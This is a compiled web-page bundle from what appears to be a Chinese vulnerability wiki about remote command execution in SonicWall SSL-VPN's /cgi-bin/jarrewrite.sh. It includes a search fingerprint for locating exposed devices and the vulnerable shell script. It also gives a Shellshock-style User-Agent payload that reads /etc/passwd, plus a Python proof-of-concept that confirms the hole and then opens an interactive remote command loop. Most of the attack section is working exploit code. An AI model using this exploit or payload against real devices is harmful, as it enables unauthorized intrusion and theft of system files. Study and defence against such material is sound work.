import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e}from"./app-58e4a7d6.js";const p={},t=e(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>SonicWall SSL-VPN 远程命令执行在1月24日被公开 EXP，此设备存在远程命令执行漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>SonicWall SSL-VPN
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;SONICWALL-SSL-VPN&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>出现漏洞的文件为 <strong>/cgi-bin/jarrewrite.sh</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token shebang important">#!/bin/bash</span>

<span class="token comment"># jarrewrite.sh:</span>
<span class="token comment"># Script takes a jar/class file and a working directory; modifies class files</span>
<span class="token comment"># within the jar and repackages them.</span>

<span class="token assign-left variable">USAGE_STR</span><span class="token operator">=</span><span class="token string">&quot;Usage: <span class="token variable">$0</span> &lt;jar/class file&gt; &lt;path-to-working directory&gt;&quot;</span>

<span class="token comment"># Validate number of args</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$#</span> <span class="token parameter variable">-ne</span> <span class="token number">2</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
<span class="token builtin class-name">echo</span> <span class="token variable">\${USAGE_STR}</span><span class="token punctuation">;</span>
<span class="token builtin class-name">exit</span> -1<span class="token punctuation">;</span>
<span class="token keyword">fi</span>

<span class="token keyword">for</span> <span class="token for-or-select variable">param</span> <span class="token keyword">in</span> <span class="token variable">$*</span><span class="token punctuation">;</span> <span class="token keyword">do</span>
    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">&quot;<span class="token variable">$param</span>&quot;</span> <span class="token operator">==</span> <span class="token string">&quot;-h&quot;</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
        <span class="token builtin class-name">echo</span> <span class="token variable">\${USAGE_STR}</span><span class="token punctuation">;</span>
        <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">fi</span>
<span class="token keyword">done</span>

<span class="token comment"># constants</span>
<span class="token assign-left variable">BOUNDARY</span><span class="token operator">=</span><span class="token string">&quot;-------------------------------------------------------------&quot;</span>
<span class="token assign-left variable">BASE_DIR</span><span class="token operator">=</span>/tmp
<span class="token assign-left variable">JAVA_SRC</span><span class="token operator">=</span><span class="token variable">$1</span>
<span class="token assign-left variable">WDIR</span><span class="token operator">=</span><span class="token variable">$2</span>
<span class="token assign-left variable">CWD</span><span class="token operator">=</span><span class="token variable"><span class="token variable">\`</span><span class="token builtin class-name">pwd</span><span class="token variable">\`</span></span>
<span class="token assign-left variable">FULL_JAVA_SRC_PATH</span><span class="token operator">=</span><span class="token variable">\${BASE_DIR}</span>/<span class="token variable">\${WDIR}</span>/<span class="token variable">\${JAVA_SRC}</span>
<span class="token assign-left variable">CLASSES_DIR</span><span class="token operator">=</span>classes
<span class="token assign-left variable">META_INF_DIR</span><span class="token operator">=</span><span class="token variable">\${BASE_DIR}</span>/<span class="token variable">\${WDIR}</span>/<span class="token variable">\${CLASSES_DIR}</span>/META-INF
<span class="token assign-left variable">MANIFEST</span><span class="token operator">=</span><span class="token variable">\${META_INF_DIR}</span>/MANIFEST.MF
<span class="token assign-left variable">MANIFEST_DIGEST_FILE</span><span class="token operator">=</span><span class="token variable">\${META_INF_DIR}</span>/SWALL_SIGNATURE.SF
<span class="token assign-left variable">SIGNATURE_FILE</span><span class="token operator">=</span><span class="token variable">\${META_INF_DIR}</span>/SWALL_SIGNATURE.DSA
<span class="token assign-left variable">CODESIGNER_CRT</span><span class="token operator">=</span>./<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/var/cs_cert/httprpCodeSignerX509Crt.pem
<span class="token assign-left variable">CODESIGNER_PVTKEY</span><span class="token operator">=</span>./<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/var/cs_cert/httprpCodeSignerPvtkey.pem
<span class="token assign-left variable">DO_SIGN</span><span class="token operator">=</span><span class="token number">0</span>

<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span>  <span class="token variable">\${FULL_JAVA_SRC_PATH}</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>
<span class="token builtin class-name">echo</span> <span class="token string">&quot;File not found: <span class="token variable">\${FULL_JAVA_SRC_PATH}</span>&quot;</span><span class="token punctuation">;</span>
<span class="token builtin class-name">exit</span> -2<span class="token punctuation">;</span>
<span class="token keyword">fi</span>

<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">\${JAVA_SRC<span class="token operator">##</span>*.}</span> <span class="token operator">==</span> <span class="token string">&quot;jar&quot;</span> <span class="token punctuation">]</span>
<span class="token comment"># Using bracket in variable substitution.</span>
<span class="token keyword">then</span>

<span class="token comment"># organize</span>
<span class="token function">mkdir</span> <span class="token variable">\${BASE_DIR}</span>/<span class="token variable">$WDIR</span>/<span class="token variable">$CLASSES_DIR</span>

<span class="token comment"># unzip jar</span>
<span class="token function">unzip</span> <span class="token parameter variable">-d</span> <span class="token variable">\${BASE_DIR}</span>/<span class="token variable">\${WDIR}</span>/<span class="token variable">\${CLASSES_DIR}</span> <span class="token variable">\${FULL_JAVA_SRC_PATH}</span><span class="token punctuation">;</span>

<span class="token comment"># Simple sanity check to see if the JAR has already been signed. </span>
<span class="token comment"># FIXME: This is not a complete check,because the original JAR signature </span>
<span class="token comment"># has to be verified completely otherwise a malicious applet</span>
<span class="token comment"># could access the local resources with SSL VPN signing it.</span>

<span class="token assign-left variable">old_sf_files</span><span class="token operator">=</span><span class="token variable"><span class="token variable">\`</span>/bin/ls $<span class="token punctuation">{</span>META_INF_DIR<span class="token punctuation">}</span>/*.<span class="token punctuation">[</span>sS<span class="token punctuation">]</span><span class="token punctuation">[</span>fF<span class="token punctuation">]</span> <span class="token variable">\`</span></span>
<span class="token assign-left variable">old_sign_files</span><span class="token operator">=</span><span class="token variable"><span class="token variable">\`</span>/bin/ls $<span class="token punctuation">{</span>META_INF_DIR<span class="token punctuation">}</span>/*.<span class="token punctuation">[</span>rRdD<span class="token punctuation">]</span><span class="token punctuation">[</span>sS<span class="token punctuation">]</span><span class="token punctuation">[</span>aA<span class="token punctuation">]</span> <span class="token variable">\`</span></span>

<span class="token keyword">for</span> <span class="token for-or-select variable">sf_file</span> <span class="token keyword">in</span> <span class="token variable">$old_sf_files</span>
<span class="token keyword">do</span>
	<span class="token keyword">for</span> <span class="token for-or-select variable">sign_file</span> <span class="token keyword">in</span> <span class="token variable">$old_sign_files</span>
    <span class="token keyword">do</span>
        <span class="token assign-left variable">DO_SIGN</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token builtin class-name">break</span>
    <span class="token keyword">done</span><span class="token punctuation">;</span>
    <span class="token builtin class-name">break</span><span class="token punctuation">;</span>
<span class="token keyword">done</span>

<span class="token comment"># remove all manifest info including signatures</span>
<span class="token comment"># remove all that match mf|MF|sf|SF or dsa|DSA|rsa|RSA</span>
<span class="token function">rm</span> <span class="token parameter variable">-f</span> <span class="token variable">\${BASE_DIR}</span>/<span class="token variable">\${WDIR}</span>/<span class="token variable">\${CLASSES_DIR}</span>/META-INF/*.<span class="token punctuation">[</span>sSmM<span class="token punctuation">]</span><span class="token punctuation">[</span>fF<span class="token punctuation">]</span> <span class="token variable">\${BASE_DIR}</span>/<span class="token variable">\${WDIR}</span>/<span class="token variable">\${CLASSES_DIR}</span>/META-INF/*.?<span class="token punctuation">[</span>sS<span class="token punctuation">]</span><span class="token punctuation">[</span>aA<span class="token punctuation">]</span>

<span class="token assign-left variable">OUTPUT_JAR</span><span class="token operator">=</span><span class="token string">&quot;<span class="token variable">\${FULL_JAVA_SRC_PATH}</span>&quot;</span>

<span class="token assign-left variable">classfiles</span><span class="token operator">=</span><span class="token variable"><span class="token variable">\`</span>/usr/bin/find $<span class="token punctuation">{</span>BASE_DIR<span class="token punctuation">}</span>/$<span class="token punctuation">{</span>WDIR<span class="token punctuation">}</span>/$<span class="token punctuation">{</span>CLASSES_DIR<span class="token punctuation">}</span> <span class="token parameter variable">-type</span> f<span class="token variable">\`</span></span>

<span class="token comment">#New Manifest file</span>
<span class="token assign-left variable">MANIFEST_MAIN_ATTR</span><span class="token operator">=</span><span class="token string">&quot;Manifest-Version: 1.0<span class="token entity" title="\\n">\\n</span>Created-By: 1.0 (SonicWALL Inc.)<span class="token entity" title="\\n">\\n</span>&quot;</span>

<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">&quot;Creating Manifest file ... &quot;</span> 
<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token variable">\${MANIFEST_MAIN_ATTR}</span> <span class="token operator">&gt;</span> <span class="token variable">\${MANIFEST}</span>

<span class="token keyword">for</span> <span class="token for-or-select variable">file</span> <span class="token keyword">in</span> <span class="token variable">$classfiles</span>
<span class="token keyword">do</span>
	<span class="token builtin class-name">echo</span> <span class="token variable">$BOUNDARY</span>
	<span class="token builtin class-name">echo</span> <span class="token variable">$file</span>
	<span class="token builtin class-name">echo</span> <span class="token variable">$BOUNDARY</span>
	./jdasm <span class="token variable">$file</span> <span class="token variable">$file</span>

	<span class="token comment">#Update manifest file</span>
	<span class="token assign-left variable">SHA1_MANIFEST_ENTRY_CLASS</span><span class="token operator">=</span><span class="token variable"><span class="token variable">\`</span>openssl dgst <span class="token parameter variable">-sha1</span> <span class="token parameter variable">-binary</span> $file <span class="token operator">|</span> openssl base64<span class="token variable">\`</span></span>
	<span class="token assign-left variable">MANIFEST_ENTRY</span><span class="token operator">=</span><span class="token string">&quot;Name: <span class="token variable">\${file<span class="token operator">##</span>\${BASE_DIR}</span>/<span class="token variable">\${WDIR}</span>/<span class="token variable">\${CLASSES_DIR}</span>/}<span class="token entity" title="\\n">\\n</span>SHA1-Digest: <span class="token variable">\${SHA1_MANIFEST_ENTRY_CLASS}</span><span class="token entity" title="\\n">\\n</span>&quot;</span>
	<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token variable">\${MANIFEST_ENTRY}</span> <span class="token operator">&gt;&gt;</span> <span class="token variable">\${MANIFEST}</span>

	<span class="token builtin class-name">echo</span> <span class="token variable">$BOUNDARY</span>
<span class="token keyword">done</span>

<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">\${DO_SIGN}</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">&quot;Creating Manifest Signature file and Signature block&quot;</span> <span class="token operator">&gt;&gt;</span> <span class="token variable">$OUTLOG</span>
/usr/sbin/sw_jarsigner <span class="token parameter variable">-m</span> <span class="token variable">\${MANIFEST}</span> <span class="token parameter variable">-s</span> <span class="token variable">\${MANIFEST_DIGEST_FILE}</span> <span class="token parameter variable">-S</span> <span class="token variable">\${SIGNATURE_FILE}</span> <span class="token parameter variable">-c</span> <span class="token variable">\${CODESIGNER_CRT}</span> <span class="token parameter variable">-k</span> <span class="token variable">\${CODESIGNER_PVTKEY}</span>
<span class="token keyword">fi</span>

<span class="token function">rm</span> <span class="token parameter variable">-f</span> <span class="token variable">\${FULL_JAVA_SRC_PATH}</span>
<span class="token builtin class-name">cd</span> <span class="token variable">\${BASE_DIR}</span>/<span class="token variable">\${WDIR}</span>/<span class="token variable">\${CLASSES_DIR}</span><span class="token punctuation">;</span>
<span class="token function">zip</span> <span class="token parameter variable">-r</span> <span class="token variable">\${OUTPUT_JAR}</span> *
<span class="token builtin class-name">cd</span> <span class="token variable">\${CWD}</span>

<span class="token comment"># clean</span>
<span class="token function">rm</span> <span class="token parameter variable">-Rf</span> <span class="token variable">\${BASE_DIR}</span>/<span class="token variable">\${WDIR}</span>/<span class="token variable">\${CLASSES_DIR}</span>

<span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token variable">\${JAVA_SRC<span class="token operator">##</span>*.}</span> <span class="token operator">==</span> <span class="token string">&quot;class&quot;</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
<span class="token comment"># if file is a class</span>

<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-e</span>  <span class="token variable">\${FULL_JAVA_SRC_PATH}</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>
<span class="token builtin class-name">echo</span> <span class="token string">&quot;File not found: <span class="token variable">\${FULL_JAVA_SRC_PATH}</span>&quot;</span><span class="token punctuation">;</span>
<span class="token builtin class-name">exit</span> -2<span class="token punctuation">;</span>
<span class="token keyword">fi</span>
./jdasm <span class="token variable">\${FULL_JAVA_SRC_PATH}</span> <span class="token variable">\${FULL_JAVA_SRC_PATH}</span><span class="token punctuation">;</span>
<span class="token keyword">fi</span> 

<span class="token builtin class-name">echo</span> <span class="token string">&quot;Recursive Class Rewrite Completed.&quot;</span>
<span class="token builtin class-name">exit</span> <span class="token number">0</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这个文件存在命令注入漏洞，漏洞触发在 <strong>Usage-Agent</strong></p><p>发送如下请求即可命令执行</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162259032.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>GET https://xxx.xxx.xxx.xxx/cgi-bin/jarrewrite.sh
User-Agent: <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token builtin class-name">:</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> <span class="token punctuation">;</span> /bin/bash <span class="token parameter variable">-c</span> <span class="token string">&#39;cat /etc/passwd&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>发送请求会下载一个文件，文件内容为命令执行的结果</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162259265.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> random
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> InsecureRequestWarning

<span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mGithub : https://github.com/PeiQi0                                 \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34m公众号 : PeiQi文库                                                     \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mVersion: SonicWall SSL-VPN                                       \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36m使用格式:  python3 poc.py                                            \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mCmd         &gt;&gt;&gt; whoami                                            \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_1</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/cgi-bin/jarrewrite.sh&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;() { :; }; echo ; /bin/bash -c &#39;%s&#39;&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">}</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>vuln_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 正在请求 {}/cgi-bin/jarrewrite.sh \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&quot;root&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text <span class="token keyword">and</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 响应为:\\n{} \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                cmd <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mCmd &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> cmd <span class="token operator">==</span> <span class="token string">&quot;exit&quot;</span><span class="token punctuation">:</span>
                    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    POC_2<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 请求失败 \\033[0m&quot;</span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 请求失败 \\033[0m&quot;</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_2</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/cgi-bin/jarrewrite.sh&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;() { :; }; echo ; /bin/bash -c &#39;%s&#39;&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">}</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>vuln_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 响应为:\\n{} \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 请求失败 \\033[0m&quot;</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    title<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cmd <span class="token operator">=</span> <span class="token string">&#39;cat /etc/passwd&#39;</span>
    target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mPlease input Attack Url\\nUrl &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    POC_1<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162259317.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,18),l=[t];function i(o,c){return s(),a("div",null,l)}const k=n(p,[["render",i],["__file","SonicWall SSL-VPN 远程命令执行漏洞.html.vue"]]);export{k as default};
